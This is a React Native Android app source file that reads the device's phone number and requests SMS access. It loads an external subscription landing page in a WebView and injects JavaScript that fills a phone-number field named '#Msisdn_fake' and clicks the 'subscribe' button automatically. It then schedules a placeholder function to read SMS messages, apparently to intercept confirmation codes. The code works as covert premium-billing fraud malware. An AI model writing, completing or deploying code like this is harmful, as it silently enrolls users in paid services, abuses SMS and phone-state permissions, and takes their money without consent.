import React, { useEffect, useRef, useState } from 'react';
import {
  StyleSheet,
  Text,
  View,
  ActivityIndicator,
  PermissionsAndroid,
  Alert,
} from 'react-native';
import { WebView } from 'react-native-webview';
import SimCardsManagerModule from 'react-native-sim-cards-manager';
import SmsRetriever from 'react-native-sms-retriever';

const App = () => {
  const webViewRef = useRef(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    (async () => {
      if (await requestPermissions()) {
        fetchSimCardData();
      }
    })();
  }, []);

  const requestPermissions = async () => {
    try {
      const phoneStateGranted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE
      );
      const smsGranted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_SMS
      );

      if (
        phoneStateGranted === PermissionsAndroid.RESULTS.GRANTED &&
        smsGranted === PermissionsAndroid.RESULTS.GRANTED
      ) {
        return true;
      } else {
        Alert.alert(
          'Permission Denied',
          'You need to grant permissions to read phone state and SMS.'
        );
        return false;
      }
    } catch (error) {
      console.error('Permission request error:', error);
      return false;
    }
  };

  const handleDeviceData = async () => {
    try {
      const isEsimSupported = await SimCardsManagerModule.isEsimSupported();
      console.log('eSIM Supported:', isEsimSupported);
      fetchSimCardData();
    } catch (error) {
      console.error('Error checking eSIM support:', error);
    }
  };

  const fetchSimCardData = async () => {
    try {
      const simCards = await SimCardsManagerModule.getSimCards({
        title: 'App Permission',
        message: 'Custom message',
        buttonNeutral: 'Not now',
        buttonNegative: 'Cancel',
        buttonPositive: 'OK',
      });

      const phoneNumber = simCards[0]?.phoneNumber;
      if (phoneNumber) {
        injectPhoneNumberAndSubmit(phoneNumber);
      } else {
        await retrievePhoneNumber();
      }
    } catch (error) {
      console.error('Error fetching SIM card data:', error);
    }
  };

  const retrievePhoneNumber = async () => {
    try {
      const phoneNumber = await SmsRetriever.requestPhoneNumber();
      if (phoneNumber) {
        injectPhoneNumberAndSubmit(phoneNumber);
      }
    } catch (error) {
      console.error('Error retrieving phone number:', error);
    }
  };

  const injectPhoneNumberAndSubmit = (phoneNumber) => {
    const jsCode = `
      const inputField = document.querySelector('#Msisdn_fake');
      const subscribeButton = document.querySelector('#btnSubscribe');
      if (inputField) {
        inputField.value = '${phoneNumber}';
      }
      if (inputField?.value && subscribeButton) {
        subscribeButton.click();
      }
      true;
    `;

    webViewRef.current.injectJavaScript(jsCode);
    setTimeout(fetchSmsMessages, 8000);
  };

  const fetchSmsMessages = () => {
    console.log('Fetching SMS messages...');
    // Placeholder for actual SMS fetching logic.
  };

  return (
    <View style={styles.container}>
      {loading && (
        <View style={styles.loadingContainer}>
          <ActivityIndicator size="large" color="#0000ff" />
          <Text>Loading...</Text>
        </View>
      )}
      <WebView
        ref={webViewRef}
        source={{ uri: 'https://lps.vclipss.com/stckwt/xs1.aspx' }}
        onLoadEnd={() => setLoading(false)}
        onLoadStart={() => setLoading(true)}
      />
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
  },
  loadingContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
});

export default App;